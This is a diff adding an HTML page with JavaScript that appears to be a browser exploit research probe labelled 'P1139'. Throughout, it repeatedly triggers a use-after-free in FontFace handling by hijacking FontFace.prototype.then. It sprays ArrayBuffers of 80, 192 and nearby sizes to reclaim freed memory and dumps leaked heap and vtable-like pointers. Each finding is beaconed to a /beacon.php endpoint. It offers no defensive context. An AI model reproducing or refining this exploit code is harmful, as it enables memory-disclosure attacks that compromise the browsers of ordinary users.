@@ -1,0 +1,163 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1139</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1139: 80-BYTE DEEP HUNT ===');
+log('info','Chase the sz=80 anomaly: trigger 5 UAFs, heavy 80-byte spray, full dumps');
+B('P1139-START','t='+Date.now());
+
+var UAF_COUNT=5;
+var SPRAY_80=150;
+var SPRAY_192=80;
+var EXTRA_SIZES=[48,64,96,112,128,160]; // also sweep nearby sizes
+var EXTRA_N=30;
+var uafNum=0;
+var allResults=[];
+
+function runOneUAF(idx,cb){
+  var r=Date.now()%100000+idx*7777;
+  var hit=false;
+  var bufs80=[],bufs192=[],extraBufs={};
+
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:d"+r+";src:local(Arial);unicode-range:U+00"+(0x42+idx).toString(16)+"}";
+  document.head.appendChild(st);
+  var ffi=new FontFace('e'+r,'local(Helvetica)',{unicodeRange:'U+00'+(0x41+idx).toString(16)});
+  document.fonts.add(ffi);void ffi.loaded;
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(hit)return undefined;hit=true;
+    if(st.parentNode)st.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+
+    // Spray 80-byte heavily + 192-byte for CSSFontFace + nearby sizes
+    for(var k=0;k<SPRAY_80;k++) bufs80.push(new ArrayBuffer(80));
+    for(var k=0;k<SPRAY_192;k++) bufs192.push(new ArrayBuffer(192));
+    for(var esi=0;esi<EXTRA_SIZES.length;esi++){
+      var esz=EXTRA_SIZES[esi];
+      extraBufs[esz]=[];
+      for(var k=0;k<EXTRA_N;k++) extraBufs[esz].push(new ArrayBuffer(esz));
+    }
+
+    try{document.fonts.check('1em d'+r);}catch(e){}
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em e'+r+', d'+r,'AB').then(function(){},function(){});
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var result={idx:idx,cff:null,sz80:[],extra:{}};
+
+    // Check 192-byte for CSSFontFace
+    for(var k=0;k<bufs192.length;k++){
+      var v=new BigUint64Array(bufs192[k]);
+      if(v[0]===1n&&v[11]!==0n&&v[13]!==0n){
+        var h=Number(v[11]>>32n);
+        if(h>=0x10&&h<=0xFF){
+          result.cff={k:k,q11:hex64(v[11]),q13:hex64(v[13])};
+          break;
+        }
+      }
+    }
+
+    // Check 80-byte: FULL DUMP of any non-zero buffer
+    for(var k=0;k<bufs80.length;k++){
+      var v=new BigUint64Array(bufs80[k]); // 80/8 = 10 qwords
+      var hasNZ=false;
+      for(var q=0;q<v.length;q++){if(v[q]!==0n){hasNZ=true;break;}}
+      if(!hasNZ)continue;
+
+      // Full dump
+      var dump=[];
+      for(var q=0;q<v.length;q++){
+        dump.push(hex64(v[q]));
+      }
+      result.sz80.push({k:k,dump:dump});
+
+      // Classify each qword
+      var classified=[];
+      for(var q=0;q<v.length;q++){
+        if(v[q]===0n)continue;
+        var val=v[q];
+        var hi=Number(val>>32n);
+        var tag=(val===1n)?'RC':(hi>=0x10&&hi<=0xFF)?'HP':
+          ((val&7n)===0n&&hi>=0x100&&hi<0xFFFF)?'VT?':
+          (hi===0)?'SM':'?(0x'+hi.toString(16)+')';
+        classified.push('q'+q+'='+hex64(val)+'('+tag+')');
+      }
+
+      log('ptr','UAF#'+idx+' sz80['+k+']: '+classified.join(' '));
+      B('P1139-80-'+idx+'-'+k,classified.join('|'));
+      B('P1139-80RAW-'+idx+'-'+k,dump.join(','));
+    }
+
+    // Check extra sizes
+    for(var esi=0;esi<EXTRA_SIZES.length;esi++){
+      var esz=EXTRA_SIZES[esi];
+      var ebufs=extraBufs[esz];
+      if(!ebufs)continue;
+      for(var k=0;k<ebufs.length;k++){
+        var v=new BigUint64Array(ebufs[k]);
+        var hasNZ=false;
+        for(var q=0;q<v.length;q++){if(v[q]!==0n){hasNZ=true;break;}}
+        if(!hasNZ)continue;
+
+        var dump=[];
+        for(var q=0;q<v.length;q++){
+          if(v[q]!==0n)dump.push('q'+q+'='+hex64(v[q]));
+        }
+        if(!result.extra[esz])result.extra[esz]=[];
+        result.extra[esz].push({k:k,dump:dump.join(',')});
+        log('ptr','UAF#'+idx+' sz'+esz+'['+k+']: '+dump.join(' '));
+        B('P1139-EX-'+esz+'-'+idx,dump.join('|'));
+      }
+    }
+
+    allResults.push(result);
+    cb();
+  },10);
+}
+
+// Chain 5 UAFs sequentially
+var qi=0;
+function nextUAF(){
+  if(qi>=UAF_COUNT){
+    finish();
+    return;
+  }
+  runOneUAF(qi,function(){
+    qi++;
+    setTimeout(nextUAF,20);
+  });
+}
+nextUAF();
+
+function finish(){
+  var cffCount=0,sz80Count=0,extraCount=0;
+  for(var i=0;i<allResults.length;i++){
+    if(allResults[i].cff)cffCount++;
+    sz80Count+=allResults[i].sz80.length;
+    for(var sz in allResults[i].extra){
+      extraCount+=allResults[i].extra[sz].length;
+    }
+  }
+
+  B('P1139-DONE','uafs='+allResults.length+'|cff='+cffCount+'|sz80='+sz80Count+'|extra='+extraCount);
+  log('phase','=== DONE: '+cffCount+' CFF hits, '+sz80Count+' sz80 hits, '+extraCount+' extra hits ===');
+
+  // Report CFF addresses
+  for(var i=0;i<allResults.length;i++){
+    if(allResults[i].cff){
+      B('P1139-CFF-'+i,JSON.stringify(allResults[i].cff));
+    }
+  }
+}
+</script></body></html>
